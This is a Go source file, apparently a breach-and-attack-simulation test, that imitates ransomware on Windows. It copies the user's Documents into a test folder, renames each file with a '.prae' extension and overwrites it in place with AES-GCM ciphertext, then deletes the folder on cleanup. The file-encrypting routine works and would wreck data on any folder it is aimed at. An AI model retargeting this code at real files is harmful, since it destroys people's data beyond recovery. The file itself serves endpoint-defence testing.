// + build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"

	"github.com/praetorian-inc/chariot-bas/endpoint"
)

var l sync.Mutex

func encryptFile(wg *sync.WaitGroup, path string) {
	defer wg.Done()

	err := os.Rename(path, path+".prae")
	if err != nil {
		fmt.Println(err)
		return
	}

	file, err := os.OpenFile(path+".prae", os.O_RDWR, 0)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer file.Close()

	fi, err := file.Stat()
	if err != nil {
		fmt.Println(err)
		return
	}

	var offset int64
	fileSize := fi.Size()

	if fileSize > 0x1400000 {
		chunks := fileSize / 0xA00000
		buffer := make([]byte, 0x100000)

		var i int64
		for i = 0; i < chunks; i++ {
			fmt.Printf("Processing chunk %d\\%d (%s)\n", i+1, chunks, path)
			offset = i * 0xA00000
			file.ReadAt(buffer, offset)
			cipher, _, err := endpoint.AES256GCMEncrypt(buffer)
			if err != nil {
				continue
			}
			file.WriteAt(cipher, offset)
		}
	} else {
		var sizeToEncrypt int64
		if fileSize > 0x400000 {
			sizeToEncrypt = 0x400000
		} else {
			sizeToEncrypt = fileSize
		}

		buffer := make([]byte, sizeToEncrypt)
		r, _ := file.ReadAt(buffer, offset)
		if int64(r) != sizeToEncrypt {
			return
		}

		cipher, _, err := endpoint.AES256GCMEncrypt(buffer)
		if err != nil {
			return
		}
		file.WriteAt(cipher, offset)
	}
}

func ransomware(dir string) {
	queueMax := runtime.GOMAXPROCS(0) * 2
	queueCounter := 0
	var wg sync.WaitGroup

	err := filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if info.IsDir() == false {
			if strings.Contains(info.Name(), ".prae") == false {
				if queueCounter >= queueMax {
					wg.Wait()
					queueCounter = 0
				}
				wg.Add(1)
				go encryptFile(&wg, path)
				queueCounter++
			}
		}
		return nil
	})
	if err != nil {
		fmt.Println(err)
	}
	wg.Wait()
}

func createFakeDirectory() string {
	dir := os.Getenv("USERPROFILE") + "\\Downloads\\praetorian_security_test"
	os.MkdirAll(dir, os.ModePerm)
	xcopy := exec.Command("xcopy", os.Getenv("USERPROFILE")+"\\Documents", dir, "/E")
	xcopy.Run()
	return dir
}

func test() {
	ransomware(createFakeDirectory())
	endpoint.Stop(endpoint.Risk.Allowed)
}

func cleanup() {
	os.RemoveAll(os.Getenv("USERPROFILE") + "\\Downloads\\praetorian_security_test")
}

func main() {
	endpoint.Start(test, cleanup)
}
